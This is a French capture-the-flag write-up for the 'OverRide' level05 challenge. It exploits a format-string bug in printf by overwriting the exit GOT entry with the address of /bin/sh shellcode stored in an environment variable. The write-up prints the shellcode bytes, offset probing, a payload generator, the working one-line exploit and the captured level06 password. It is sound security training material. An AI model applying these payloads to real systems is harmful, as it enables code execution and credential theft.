# Level 05

## Introduction

fgets est protégé, et printf est vulnérable à un exploit de pattern.

## Resumé

 1. Décompiler le programme : https://dogbolt.org/?id=061a1527-1288-4c44-8fe6-bc482323508f#Hex-Rays=115 ;
 2. On trouve l'adresse de la fonction exit (car elle est appelé après printf) ;
 3. On trouve l'adresse du shellcode dans notre env ;
 4. On overwrite l'adresse de la fonction exit par l'adresse de notre shellcode.

## Etapes

(Voir [source.c](../source.c) pour le code complet)

```c
int main(int argc, const char **argv, const char **envp)
{
    char buffer[100],

    i = 0;
    fgets(buffer, 100, stdin);
    for (int i = 0; i < strlen(buffer); ++i)
        if ('A' <= buffer[i] && buffer[i] <= 'Z')
            buffer[i] ^= 0x20u;

    printf(buffer);
    exit(0);
}
```

Variable de la fonction exit :

```sh
objdump --dynamic-reloc ./level05
080497e0 R_386_JUMP_SLOT   exit
```

Ajout de mon shellcode favori dans l'env :

```sh
# shellcode = https://www.exploit-db.com/exploits/13357 

export ICE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"');
```

On recup l'adresse dans l'env :

```sh
(gdb) x/20s environ  
0xffffdc80:  	"\220\
```

Conversion hexadecimal vers decimal :
 - dc80 => 56448
 - fffff => 65535

En testant avec plein de `%p` on va trouver quel argument nous intéresse :

```
level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "%p " * 20') | ./level05
0x64 0xf7fcfac0 0xf7ec3af9 0xffffd2cf 0xffffd2ce (nil) 0xffffffff 0xffffd354 0xf7fdb000 0x80497e0 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
```

On retrouve l’adresse d’exit `0x80497e0` - qui est au début du pattern printf - en dixième position. Donc on va utiliser le 10ème argument de printf.

Verifiction avec gdb :

```
(gdb) run < <(python -c 'print "aaaa" + " %10$p"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level05/level05 < <(python -c 'print "aaaa" + " %10$p"')

Breakpoint 2, 0xf7e78480 in printf () from /lib32/libc.so.6
(gdb) c
Continuing.
aaaa 0x61616161
```

**Rappel :**
 - `10$` sélection du 10eme argument de printf ;
 - `h` => Indique que l’argument est un short et non un int ;
 - `n` => Indique qu’au lieu d’afficher quelque chose, on va écrire dans une variable int, le nombre de caractères déjà imprimés ;
 - donc `hn` => au lieu d’écrire dans un int, on écrit dans un short.

 Ici, réécrire `dc80` n'est pas suffisant. Il faut faire une modification double (double printf expliqué ici : https://www.infosecinstitute.com/resources/hacking/exploiting-format-strings-getting-the-shell/ ).

```py
# On veut override exit (0x080497e0) avec l'adresse de notre shellcode (0xffffdc80)

# objdump --dynamic-reloc ./level05
#   080497e0 R_386_JUMP_SLOT   exit

# (gdb) x/20s environ  
# 0xffffdc80:      "\220\
# dc80 => 56448
# fffff => 65535

by1 = 56448
by2 = 65535

start = 4 * 2
first = by1 - start
second = by2 - by1

print('(python -c \'print "', end='')

# The both (short) addresses of exit to write 2 bytes each
print("\\xe0\\x97\\x04\\x08", end='') # two first bytes of exit
print("\\xe2\\x97\\x04\\x08", end='') # two last bytes of exit

# The length will be the value that we want to write
print("%" + str(first) + "c%10$hn%" + str(second) + "c%11$hn", end='')

print('"\') | ./level05\n')

#(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%56440c%10$hn%9087c%11$hn"') | ./level05
```

```sh
(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%56440c%10$hn%9087c%11$hn"') | ./level05
$ cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

On a donc le flag :

```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```